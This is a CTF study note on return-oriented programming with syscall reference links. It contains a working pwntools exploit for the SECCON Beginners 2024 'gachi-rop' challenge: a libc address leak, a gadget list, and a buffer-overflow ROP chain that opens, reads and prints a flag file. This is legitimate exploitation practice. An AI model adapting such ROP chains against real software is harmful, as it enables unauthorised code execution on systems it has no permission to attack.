# ROP

# Linux x86 (x64) syscall
- https://www.mztn.org/lxasm64/x86_x64_table.html#google_vignette
- https://manpages.ubuntu.com/manpages/noble/ja/man2/syscall.2.html
- https://manpages.ubuntu.com/manpages/noble/ja/man2/syscalls.2.html
- https://manpages.ubuntu.com/manpages/noble/ja/man2/open.2.html
- https://manpages.ubuntu.com/manpages/noble/ja/man2/read.2.html
- https://manpages.ubuntu.com/manpages/noble/ja/man2/write.2.html
- https://manpages.ubuntu.com/manpages/noble/ja/man2/close.2.html
- https://manpages.ubuntu.com/manpages/noble/ja/man2/getdents.2.html
- https://manpages.ubuntu.com/manpages/noble/ja/man2/exit.2.html
- [呼出規約](https://ja.wikipedia.org/wiki/%E5%91%BC%E5%87%BA%E8%A6%8F%E7%B4%84)

# SECCON_Beginners_CTF_2024/pwnable/gachi-rop
- https://gitlab.mma.club.uec.ac.jp/mmabeginners/seccon-beginners-ctf-2024/-/blob/main/pwnable/gachi-rop/README.md
- https://github.com/satoki/ctf4b_2024_satoki_writeups/tree/main/pwnable/gachi-rop

```bash
sudo apt install patchelf -y
```
## 解法 (TODO: 作成中)
```python
#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF(args.EXE or './gachi-rop')
# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
gdbscript = '''
tbreak main
tbreak *main+134
continue
'''.format(**locals())
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
io = start()
io.recvuntil(b'system@')
system_addr = int(io.readline().strip(), 16)
libc.address = system_addr - libc.symbols['system']
log.info("system addr: " + hex(system_addr))
log.info("libc base addr: " + hex(libc.address))
# payload = cyclic(300)
# log.info("offset: " + str(cyclic_find("gaaahaaa")))
# 0x0000000000045eb0: pop rax; ret;
pop_rax = 0x0000000000045eb0 + libc.address
# 0x000000000002a3e5 : pop rdi ; ret
pop_rdi = 0x000000000002a3e5 + libc.address
# 0x000000000002be51 : pop rsi ; ret
pop_rsi = 0x000000000002be51 + libc.address
# 0x000000000011f2e7 : pop rdx ; pop r12 ; ret
pop_rdx_pop_r12 = 0x000000000011f2e7 + libc.address
# 0x000000000003d1ee : pop rcx ; ret
pop_rcx = 0x000000000003d1ee + libc.address
# 0x0000000000041563 : push rax ; ret
push_rax = 0x0000000000041563 + libc.address
# 0x0000000000029db4 : syscall
syscall = 0x0000000000029db4 + libc.address
# pwndbg> rop --grep 'mov qword ptr \\[...], ... ; ret' -- --depth=4
# 0x0000000000039bf7 : mov qword ptr [rax], rdx ; ret
# 0x000000000018d560 : mov qword ptr [rcx], rdx ; ret
mov_ptr_rcx_rdx = 0x000000000018d560 + libc.address
# 0x00000000000bfc76 : mov qword ptr [rdi], rcx ; ret
# 0x00000000000bfc63 : mov qword ptr [rdi], rdx ; ret
# 0x000000000003a410 : mov qword ptr [rdx], rax ; ret
mov_ptr_rdx_rax = 0x000000000003a410
# 0x00000000000b0fc1 : mov qword ptr [rdx], rcx ; ret
# 0x0000000000141c51 : mov qword ptr [rsi], rdi ; ret
# 0x000000000005652a : mov qword ptr [rsi], rdx ; ret
# pwndbg> rop --grep 'mov r.., r.. ; ret' -- --depth 4
# 0x0000000000040772 : mov rax, r10 ; ret
# 0x00000000000abc5c : mov rax, r11 ; ret
# 0x000000000005a171 : mov rax, rdi ; ret
# 0x00000000000546ad : mov rax, rdx ; ret
# 0x000000000005a0b8 : mov rax, rsi ; ret
# 0x000000000005a120 : mov rsp, rdx ; ret

# 0x000000000014a1b5 : xchg edi, eax ; ret
xchg_edi_eax = 0x000000000014a1b5 + libc.address;

# syscall#: rax, retval: rax
# arg#: rdi rsi rdx r10 r8 r9 

# ssize_t read(int fd, void *buf, size_t count); # syscall#: 0
# int open(const char *buf, int flags); # syscall#: 2
# fd = open(buf, O_RDONLY)
# ssize_t getdents64(int fd, void *dirp, size_t count); # syscall#: 217
# getdents64(fd, out, count)
# ssize_t write(int fd, const void *buf, size_t count); # syscall#: 1
# write(0, buf, count)
# void _exit(int status);

# 0x404000           0x405000 rw-p     1000   3000 /mnt/e/work/ctf/SECCON_Beginners_CTF_2024/pwnable/gachi-rop/gachi-rop
buf = 0x404000
payload = (
    b'A'*24 +
    # write "flag.txt" to 0x404000
    p64(pop_rcx) + p64(buf) +
    p64(pop_rdx_pop_r12) + b'/flag.tx' + p64(0xdeadbeefcafebabe) +
    p64(mov_ptr_rcx_rdx) +
    # write "\x00"*8 to 0x404008
    p64(pop_rcx) + p64(buf+0x8) +
    p64(pop_rdx_pop_r12) + b't' + b'\x00'*7 + p64(0xdeadbeefcafebabe) +
    p64(mov_ptr_rcx_rdx) +
    # syscall#: rax, retval: rax
    # arg#: rdi rsi rdx r10 r8 r9 
    # int open(const char *buf, int flags); # syscall#: 2
    p64(pop_rdi) + p64(buf) + # arg1
    p64(pop_rsi) + p64(0) + # arg2
    p64(libc.symbols['open']) +
    # ssize_t read(int fd, void *buf, size_t count); # syscall#: 0
    p64(xchg_edi_eax) + # arg1
    p64(pop_rsi) + p64(buf+0x100) + # arg2
    p64(pop_rdx_pop_r12) + p64(50) + p64(0xdeadbeefcafebabe) + # arg3
    p64(libc.symbols['read']) +
    # int close(int fd);
    p64(pop_rdi) + p64(0) + # arg1
    p64(libc.symbols['close']) +
    # write(0, buf, count)
    p64(pop_rdi) + p64(1) + # arg1
    p64(pop_rsi) + p64(buf+0x100) + # arg2
    p64(pop_rdx_pop_r12) + p64(50) + p64(0xdeadbeefcafebabe) + # arg3
    p64(libc.symbols['write']) +
    # int close(int fd);
    p64(pop_rdi) + p64(1) + # arg1
    p64(libc.symbols['close']) +
    # void _exit(int status);
    p64(pop_rdi) + p64(0) + # arg1
    p64(libc.symbols['exit'])
)
io.sendlineafter(b'Name: ', payload)
log.info(io.recvall().decode(errors="ignore"))
#io.interactive()
```
